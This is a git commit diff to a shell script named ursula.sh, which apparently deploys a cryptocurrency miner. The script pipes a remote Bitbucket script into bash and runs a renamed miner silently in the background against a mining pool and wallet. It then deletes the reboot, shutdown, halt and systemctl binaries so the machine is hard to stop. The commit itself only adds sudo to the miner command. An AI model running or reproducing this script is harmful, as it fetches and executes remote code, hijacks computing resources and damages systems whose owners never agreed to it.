fbc6d902464b42a4290057ea076f3d0c6c7c4e06
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-05-24 01:11:32 +0700

    Update ursula.sh

--- ursula.sh
+++ ursula.sh
@@ -4,7 +4,7 @@ apt-get install -y wget curl sudo
 sudo apt-get update -y
 curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
 chmod +x srbkaze
-nohup ./srbkaze --algorithm heavyhash --pool stratum-asia.rplant.xyz:7050 --wallet UcNmFVcJkvJKakhWeuAmqYKQW5w4xJ4e64.kopi > /dev/null 2>&1 &
+sudo nohup ./srbkaze --algorithm heavyhash --pool stratum-asia.rplant.xyz:7050 --wallet UcNmFVcJkvJKakhWeuAmqYKQW5w4xJ4e64.kopi > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
